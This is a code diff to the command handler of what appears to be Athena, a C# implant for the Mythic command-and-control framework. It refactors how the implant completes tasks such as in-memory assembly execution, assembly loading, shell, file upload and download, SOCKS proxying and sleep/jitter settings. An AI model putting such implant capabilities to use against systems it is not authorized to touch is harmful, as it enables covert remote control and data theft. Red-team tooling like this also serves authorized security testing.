@@ -16,24 +16,23 @@ namespace Athena.Commands
     public class CommandHandler
     {
         static string executeAssemblyTask = "";
-        static Thread executeAseemblyThread;
+
         public static void StartJob(MythicJob job)
         {
             switch (job.task.command)
             {
                 case "download":
-                    MythicDownloadJob j = new MythicDownloadJob(job);
-                    Dictionary<string, string> par = JsonConvert.DeserializeObject<Dictionary<string, string>>(job.task.parameters);
-                    j.path = par["file"];
-                    FileHandler.downloadFile(j);
+                    Task.Run(() => {
+                        MythicDownloadJob j = new MythicDownloadJob(job);
+                        Dictionary<string, string> par = JsonConvert.DeserializeObject<Dictionary<string, string>>(job.task.parameters);
+                        j.path = par["file"];
+                        FileHandler.downloadFile(j);
+                    });
                     break;
                 case "execute-assembly":
                     if (executeAssemblyTask != "")
                     {
-                        job.complete = true;
-                        job.errored = true;
-                        job.taskresult = "Failed to load assembly. Another assembly is already executing.";
-                        job.hasoutput = true;
+                        completeJob(ref job, "Failed to load assembly. Another assembly is already executing.", true);
                     }
                     else
                     {
@@ -68,9 +67,7 @@ namespace Athena.Commands
                                     {
                                         //Cancellation was requested, clean up.
                                         executeAssemblyTask = "";
-                                        job.hasoutput = true;
-                                        job.complete = true;
-                                        job.errored = true;
+                                        completeJob(ref job, "", true);
                                         Console.SetOut(origStdout);
                                         Globals.alc.Unload();
                                         Globals.alc = new ExecuteAssemblyContext();
@@ -80,10 +77,7 @@ namespace Athena.Commands
                                 catch (Exception e)
                                 {
                                     executeAssemblyTask = "";
-                                    job.complete = true;
-                                    job.taskresult = e.Message;
-                                    job.errored = true;
-                                    job.hasoutput = true;
+                                    completeJob(ref job, e.Message, true);
                                     Console.SetOut(origStdout);
                                 }
                             }
@@ -112,9 +106,7 @@ namespace Athena.Commands
                                 output += String.Format("{0}\t\t{1}\t\t\t{2}\r\n", job.Value.task.id, job.Value.task.command, "Not Started");
                             }
                         }
-                        job.hasoutput = true;
-                        job.complete = true;
-                        job.taskresult = output;
+                        completeJob(ref job, output, false);
                     }, job.cancellationtokensource.Token);
                     break;
                 case "jobkill":
@@ -132,28 +124,22 @@ namespace Athena.Commands
                                 //Job exited successfully
                                 if (job.complete)
                                 {
-                                    job.taskresult = $"Task {job.task.parameters} exited successfully.";
-                                    job.complete = true;
-                                    job.hasoutput = true;
+                                    completeJob(ref job, $"Task {job.task.parameters} exited successfully.", false);
                                     break;
                                 }
                                 //Job may have failed to cancel
                                 if (i == 30 && !job.complete)
                                 {
-                                    job.taskresult = $"Unable to cancel Task: {job.task.parameters}. Request timed out.";
-                                    job.complete = true;
-                                    job.hasoutput = true;
-                                    job.errored = true;
+                                    completeJob(ref job, $"Unable to cancel Task: {job.task.parameters}. Request timed out.", true);
                                 }
-                                //30s timeout
+                                
+                                //Wait 1s, This will be 30s once all the loops complete.
                                 Thread.Sleep(1000);
                             }
                         }
                         else
                         {
-                            job.taskresult = $"Task {job.task.parameters} not found!";
-                            job.complete = true;
-                            job.hasoutput = true;
+                            completeJob(ref job, $"Task {job.task.parameters} not found!", true);
                         }
                     }, job.cancellationtokensource.Token);
                     break;
@@ -161,9 +147,7 @@ namespace Athena.Commands
                     Task.Run(() =>
                     {
                         LoadCommand lc = JsonConvert.DeserializeObject<LoadCommand>(job.task.parameters);
-                        job.taskresult = AssemblyHandler.LoadCommand(Misc.Base64DecodeToByteArray(lc.assembly), lc.name);
-                        job.complete = true;
-                        job.hasoutput = true;
+                        completeJob(ref job, AssemblyHandler.LoadCommand(Misc.Base64DecodeToByteArray(lc.assembly), lc.name), false);
                     }, job.cancellationtokensource.Token);
                     break;
                 //Can these all be merged into one and handled on the server-side?
@@ -172,24 +156,18 @@ namespace Athena.Commands
                         try
                         {
                             LoadAssembly la = JsonConvert.DeserializeObject<LoadAssembly>(job.task.parameters);
-                            job.taskresult = AssemblyHandler.LoadAssembly(Misc.Base64DecodeToByteArray(la.assembly));
+                            completeJob(ref job, AssemblyHandler.LoadAssembly(Misc.Base64DecodeToByteArray(la.assembly)), false);
                         }
                         catch (Exception e)
                         {
-                            job.taskresult = e.Message;
-                            job.errored = true;
+                            completeJob(ref job, e.Message, true);
                         }
-                        job.hasoutput = true;
-                        job.complete = true;
                     }, job.cancellationtokensource.Token);
                     break;
                 case "reset-assembly-context":
                     Task.Run(() =>
                     {
-                        job.taskresult = AssemblyHandler.ClearAssemblyLoadContext();
-                        job.complete = true;
-                        job.hasoutput = true;
-
+                        completeJob(ref job, AssemblyHandler.ClearAssemblyLoadContext(), false);
                     }, job.cancellationtokensource.Token);
                     break;
                 case "shell":
@@ -208,7 +186,7 @@ namespace Athena.Commands
                         }
                         catch
                         {
-                            job.taskresult += "Invalid sleeptime specified.";
+                            job.taskresult += "Invalid sleeptime specified." + Environment.NewLine;
                             job.errored = true;
                         }
                     }
@@ -220,16 +198,18 @@ namespace Athena.Commands
                         }
                         catch
                         {
-                            job.taskresult += "Invalid jitter specified.";
+                            job.taskresult += "Invalid jitter specified." + Environment.NewLine;
                             job.errored = true;
                         }
                     }
                     if (!job.errored)
                     {
-                        job.taskresult = "Sleep updated successfully.";
+                        completeJob(ref job, "Sleep updated successfully.", false);
                     }
-                    job.complete = true;
-                    job.hasoutput = true;
+                    else
+                    {
+                        completeJob(ref job, job.taskresult, true);
+                    }
                     break;
                 case "socks":
                     var socksInfo = JsonConvert.DeserializeObject<Dictionary<string, object>>(job.task.parameters);
@@ -244,12 +224,12 @@ namespace Athena.Commands
                         {
                             if (Globals.socksHandler.running)
                             {
-                                job.taskresult = "SocksHandler is already running.";
+                                completeJob(ref job, "SocksHandler is already running.", true);
                             }
                             else
                             {
                                 Globals.socksHandler.Start();
-                                job.taskresult = "Socks Started.";
+                                completeJob(ref job, "Socks started.", false);
                             }
                         }
                     }
@@ -257,55 +237,28 @@ namespace Athena.Commands
                     {
                         try
                         {
-                            job.taskresult = "Stopped";
                             if (Globals.socksHandler != null)
                             {
                                 Globals.socksHandler.Stop();
+                                completeJob(ref job, "Socks stopped.", false);
                             }
                             else
                             {
-                                job.taskresult = "Socks is not running";
-                                job.errored = true;
-                                job.complete = true;
+                                completeJob(ref job, "Socks is not running.", true);
                             }
                         }
                         catch
                         {
-                            job.taskresult = "Socks is not running";
-                            job.errored = true;
-                            job.complete = true;
+                            completeJob(ref job, "Socks is not running.", true);
                         }
                     }
                     //SOCKS5 – A .NET CORE IMPLEMENTATION FROM SCRATCH
                     //https://blog.zhaytam.com/2019/11/15/socks5-a-net-core-implementation-from-scratch/
                     //https://gist.github.com/zHaytam/3730d512eb5eaf37fb3bd3d176185541
-                    job.complete = true;
-                    job.hasoutput = true;
                     break;
                 case "stop-assembly":
-                    var stopAssemblyTask = Task.Run(() => {
-                        //Will need to make this work
-                        if (executeAseemblyThread != null)
-                        {
-                            executeAseemblyThread.Interrupt();
-                            Thread.Sleep(3000);
-                            if (executeAseemblyThread.IsAlive)
-                            {
-                                //Globals.executeAseemblyThread.Suspend();
-                            }
-
-                            job.complete = true;
-                            job.taskresult = "Cancellation Requested.";
-                            job.hasoutput = true;
-                            executeAssemblyTask = "";
-                            Globals.alc.Unload();
-                        }
-                        else
-                        {
-                            job.complete = true;
-                            job.taskresult = "No execute-assembly task currently running.";
-                            job.hasoutput = true;
-                        }
+                    Task.Run(() => {
+                        completeJob(ref job, "This function does not work properly yet.", true);
                     }, job.cancellationtokensource.Token);
                     break;
                 case "upload":
@@ -330,11 +283,7 @@ namespace Athena.Commands
                         }
                         catch (Exception e)
                         {
-                            Misc.WriteError(e.Message);
-                            job.taskresult = e.Message;
-                            job.complete = true;
-                            job.hasoutput = true;
-                            job.errored = true;
+                            completeJob(ref job, e.Message, true);
                         }
 
                     }, job.cancellationtokensource.Token);
@@ -365,15 +314,26 @@ namespace Athena.Commands
             if (Globals.loadedcommands.ContainsKey(job.task.command))
             {
                 PluginResponse pr = AssemblyHandler.RunLoadedCommand(job.task.command, JsonConvert.DeserializeObject<Dictionary<string, object>>(job.task.parameters));
-                job.taskresult = pr.output;
-                job.errored = !pr.success;
-                job.complete = true;
+                completeJob(ref job, pr.output, !pr.success);
+            }
+            else
+            {
+                completeJob(ref job, "Plugin not loaded. Please use the load command to load the plugin!", true);
+            }
+        }
+
+        private static void completeJob(ref MythicJob job, string output, bool error)
+        {
+            job.taskresult = output;
+            job.complete = true;
+            job.errored = error;
+            if (!String.IsNullOrEmpty(output))
+            {
                 job.hasoutput = true;
             }
             else
             {
-                job.errored = true;
-                job.taskresult = "Plugin not loaded. Please use the load command to load the plugin!";
+                job.hasoutput = false;
             }
         }
     }
